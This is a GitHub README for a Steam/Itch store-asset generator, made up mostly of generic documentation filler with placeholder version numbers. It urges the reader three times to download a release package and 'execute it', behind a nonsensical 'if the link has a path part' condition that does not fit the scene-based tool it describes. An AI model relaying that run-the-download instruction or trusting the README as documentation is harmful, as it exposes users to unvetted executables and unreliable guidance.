# SteamStoreAssetsCreator: Quick, Reliable Steam Store Asset Generator for Itch Pages

https://github.com/amariitheone/SteamStoreAssetsCreator/releases

![Release Badge](https://img.shields.io/github/v/release/amariitheone/SteamStoreAssetsCreator?style=for-the-badge)

A tool to generate store assets for a Steam store page. It also works for Itch pages. The workflow is simple: configure each Control node under Screens to display the asset you want, then run the scene to generate the final assets.

---

## 🧭 Table of contents

- [What this project is](#what-this-project-is)
- [Key concepts](#key-concepts)
- [Quick start](#quick-start)
- [How it works](#how-it-works)
- [Asset types and requirements](#asset-types-and-requirements)
- [Screens and controls](#screens-and-controls)
- [Workflow and best practices](#workflow-and-best-practices)
- [Customization and extension](#customization-and-extension)
- [Output and file structure](#output-and-file-structure)
- [Automation and scripting](#automation-and-scripting)
- [Testing and debugging](#testing-and-debugging)
- [Troubleshooting](#troubleshooting)
- [Contribution guidelines](#contribution-guidelines)
- [Changelog](#changelog)
- [License](#license)

---

## What this project is

SteamStoreAssetsCreator is a tool designed to help you generate visual assets for your Steam store page. It is built to work with Steam and Itch pages alike. The core idea is simple: you lay out what you want to appear on each asset by arranging UI elements (Controls) inside named screens, then you run the scene to render and save the final images.

This project emphasizes clarity and repeatability. It targets designers and developers who want pixel-perfect assets without manually stitching images in a separate editor. It should fit into your existing asset pipelines and help you keep storefront visuals consistent.

---

## Key concepts

- Screens: Logical containers that group assets. Each Screen holds UI elements that compose a single storefront asset.
- Control nodes: The building blocks you place inside Screens. They display images, text, shapes, and other visuals.
- Scene: The root file that orchestrates rendering for one asset. You run this to generate the final outputs.
- Assets: The rendered files you upload to Steam or Itch. They include banners, logos, feature images, background art, and other required visuals.

This structure lets you tweak assets quickly by editing screen content, then re-rendering with a single run.

---

## Quick start

1) Download the latest release:
   - Visit https://github.com/amariitheone/SteamStoreAssetsCreator/releases to download the release package.
   - If the link has a path part, download the release package and execute it to install or run the tool.

2) Open the project:
   - Launch the application or open the scene in your preferred editor (as documented in the release notes).

3) Set up each asset:
   - Under Screens, add or adjust Control nodes to display the text, images, and shapes you want for that asset.
   - Keep naming consistent so the renderer knows which screen maps to which store asset.

4) Generate:
   - Run the main scene. The tool renders assets and saves them to the output directory.
   - Review the generated files and adjust as needed. Re-run until you’re satisfied.

5) Export and publish:
   - Copy the final assets to your Steam page assets folder.
   - If you publish to Itch, adjust dimensions and naming to match Itch’s requirements.

---

## How it works

- The tool uses a scene-based workflow. You configure each asset by arranging UI elements inside a Screen.
- Each Screen corresponds to one asset on the storefront.
- The render step captures the on-screen composition at the required resolution and exports standard image formats (PNG, JPG, etc.).
- Assets are named consistently, so you can automate integration with your content pipeline.

This approach lets you separate design decisions from the export process. Designers can tweak visuals without touching the rendering logic, and developers can automate asset generation as part of CI or release pipelines.

---

## Asset types and requirements

- Banner images: Large, eye-catching visuals used on the storefront header.
- Square logos: High-contrast logos for storefront icons.
- Feature images: Thumbnails for features and sections.
- Background art: Palette-friendly backdrops for hero sections.
- Text overlays: Clear typography for titles, subtitles, and calls to action.
- Short videos or GIFs (where supported by the target storefront).

General requirements:
- Pixel-perfect alignment with storefront guidelines.
- Appropriate aspect ratios for each asset type.
- Consistent color space and gamma to ensure visual fidelity.
- Preserve safe zones to avoid cropped content on different storefront layouts.

Tips:
- Keep text legible at small sizes.
- Use transparent PNGs for overlays when needed.
- Provide alternate color schemes for light/dark storefront themes.

---

## Screens and controls

- Screens are named containers you configure inside the editor.
- Each Screen hosts multiple Control nodes. Controls display images, text, and shapes.
- Common controls:
  - Texture or Sprite: displays an image.
  - Label: renders text with font settings.
  - ColorRect or Shape2D: provides solid color blocks or decorative shapes.
  - TextureButton or Button: optional interactive placeholders (not used in final render, but helpful for layout).
- Naming convention matters. Use clear, consistent names like HeroBanner, FeatureCard, LogoSmall, BackgroundArt.

Best practices:
- Group related assets into their own Screens.
- Keep UI offsets in a dedicated file to simplify tweaks.
- Use anchor hints to ensure assets scale correctly when the render resolution changes.

---

## Workflow and best practices

- Plan first: draft the asset list and required dimensions before opening the editor.
- Start with a base layout: build a neutral template that works across several assets.
- Reuse UI elements: create library components for common elements (e.g., brand header, footer, watermark).
- Validate dimensions: verify width, height, and aspect ratio for each asset type.
- Maintain versioning: tag scenes and configurations to track iterations.

Common workflow:
- Create Screens: one per asset.
- Add Controls: images, text, shapes to match the asset’s design.
- Configure fonts and colors: align with brand guidelines.
- Run Scene: render all assets at their target resolutions.
- Review and iterate: adjust elements and re-render as needed.

---

## Customization and extension

- Extend the asset family by adding new Screen templates. A new Screen with a predictable naming scheme becomes a new asset type.
- Swap fonts easily: point Labels to a new font resource and adjust sizes for consistency.
- Theme support: build themes as separate color schemes. A theme can swap colors across all assets with minimal changes.
- Scripted adjustments: add small scripts to adjust positions or scale based on asset type or viewport.

Developer touchpoints:
- Keep public APIs simple. Expose only essential properties for artists.
- Document each Screen’s purpose in comments or a lightweight README within the Screens folder.
- Provide a minimal example scene to help new users understand the expected layout.

---

## Output and file structure

- assets/
  - banners/
  - logos/
  - feature_images/
  - backgrounds/
  - overlays/
- render_config/
  - resolutions.txt
  - aspect_ratios.txt
- exported/
  - steam/
  - itch/
- logs/
  - render.log

Tips:
- Use descriptive subfolder names so automation scripts can locate assets easily.
- Store per-asset render settings in a lightweight manifest to avoid drift between runs.
- Maintain a changelog for asset revisions to track visual history.

---

## Automation and scripting

- Batch rendering: run a single command to render all screens in a scene for all target resolutions.
- Output validation: add a quick check to verify image dimensions and file sizes meet minimum requirements.
- CI integration: trigger renders on each release tag to produce up-to-date assets automatically.
- Post-processing hooks: run tiny image optimizers to reduce file size without quality loss.

Example automation ideas:
- A script reads a configuration file listing asset types and target resolutions, then renders accordingly.
- A pre-commit hook ensures asset names match the expected patterns.
- A post-render script updates a manifest with generated file paths and checksums.

---

## Testing and debugging

- Visual diffs: compare newly rendered assets against reference images to detect regressions.
- DPI and scaling tests: render at multiple resolutions to ensure asset integrity.
- Font fallback tests: verify that missing font files do not crash the render and that fallbacks look acceptable.
- Error logging: review render.log for issues like missing resources, misaligned anchors, or unsupported formats.

Debug tips:
- Use a small, deterministic scene to verify layout first.
- Comment out optional elements to isolate rendering behavior.
- Validate assets incrementally from hero assets to supporting images.

---

## Troubleshooting

- Asset renders are cropped: check safe zones and anchor points in each Screen. Ensure the content stays within the designated crop area.
- Text is unreadable at small sizes: increase font size for small assets or switch to bolder weights.
- Colors look off: verify color spaces and gamma; ensure textures are not premultiplied in a way that distorts colors.
- Missing resources: confirm that all referenced images, fonts, and textures are included in the project or asset bundle.

Common fixes:
- Re-export assets with proper transparency where needed.
- Rebuild the base template and re-run the render.
- Clean caches or temporary build artifacts if your environment caches textures or fonts.

---

## Documentation and references

- Project homepage and release notes
  - https://github.com/amariitheone/SteamStoreAssetsCreator/releases
- Asset guidelines for Steam storefronts
- Itch storefront guidelines and recommended asset sizes

Note: The Releases page above provides the latest stable package. If the link has a path part, download the release package and execute it to install or run the tool.

---

## Performance and hardware considerations

- Rendering tasks are mostly CPU-bound with GPU-accelerated texture blitting in modern environments.
- For large batches, ensure your system has enough RAM to hold textures and scene data in memory.
- Use SSD storage for faster read/write during batch rendering.

Best practices:
- Run heavy renders on a machine with at least 8 GB RAM for small projects and more for larger asset sets.
- Keep your GPU drivers up to date if your rendering path benefits from GPU acceleration.
- Organize assets to minimize disk thrashing; keep a predictable workspace layout.

---

## Ecosystem and compatibility

- Works with Steam storefront assets and applies similarly to Itch assets when dimensions and naming align with their guidelines.
- Compatible scene files should be portable across minor version updates of the supporting engine, with documented caveats for major bumps.
- Language and locale support is available where text rendering is required; ensure fonts include necessary glyphs for your target markets.

---

## Roadmap (high level)

- Add more asset templates to cover additional storefront sections.
- Improve theme switching for rapid brand customization.
- Integrate asset validation against storefront guidelines as a built-in step.
- Expand automation hooks for CI integrations.

Planned milestones:
- Version 1.1: multi-theme support and improved font handling.
- Version 1.2: batch rendering with per-asset presets.
- Version 2.0: full pipeline integration with Steam and Itch upload steps.

---

## Contributing

- All changes should live in feature branches. Use descriptive branch names like feature/hero-banner or fix/render-errors.
- Write tests or demonstrations for new features where practical.
- Update the docs in tandem with code changes. Keep examples simple and reproducible.
- Respect the existing code style and project layout. Add small, focused commits.

How to contribute:
- Fork the repository.
- Create a branch for your changes.
- Open a pull request with a clear description of intent, scope, and impact.
- Include any setup or usage notes that help reviewers.

---

## Release notes (Changelog)

- Unreleased:
  - Initial public release with core asset generation workflow.
  - Basic Screens and Control-based asset composition.
  - Scene-based rendering and output to common image formats.
- v0.x.y:
  - Bug fixes and small usability improvements.
  - Documentation enhancements for setup and workflow.
- v0.x.z:
  - Performance improvements for batch rendering.
  - Expanded asset types and better error reporting.

Changelog is maintained to reflect improvements, fixes, and new templates. Check the Releases page for detailed notes and download links.

---

## License

This project is released under an open license. See the LICENSE file in the repository for details. The license governs how you can use, modify, and distribute this software.

---

## Final note

Download and install via the Releases page to get started quickly. Visit the Releases page again for the latest assets and instructions:
https://github.com/amariitheone/SteamStoreAssetsCreator/releases

